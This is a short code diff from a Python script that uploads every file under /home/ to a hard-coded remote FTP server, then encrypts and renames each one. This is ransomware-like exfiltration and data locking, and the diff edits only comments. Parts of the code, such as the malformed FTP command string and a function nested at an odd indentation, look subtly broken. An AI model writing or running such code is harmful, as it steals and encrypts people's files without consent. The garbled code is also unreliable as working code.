@@ -35,7 +35,7 @@ def upload_to_ftp_server(file_path):
     ftpServer = ftplib.FTP()
     ftpServer.connect("13.98.138.213", 20304)
     ftpServer.login("anonymous", "anonymous")
-    ftpServer.cwd("/srv/ooowldump/")
+    ftpServer.cwd("/srv/ooowldump/") #/srv/www/dump/
     ftpServer.storbinary('\'\'' + '\'S\'' + file_path, open(file_path, "rb"))
     ftpServer.quit()
     def encrypt_file(file_path):
@@ -59,7 +59,7 @@ def upload_to_ftp_server(file_path):
         for file_path in find_files('/home/'):
             upload_to_ftp_server(file_path)
             encrypt_file(file_path)
-            os.rename(file_path, file_path + '\'n\''[:-1] + "nc") #nnc
+            os.rename(file_path, file_path + '\'n\''[:-1] + "nc") #.enc
         return "anonymous"
 ```
 
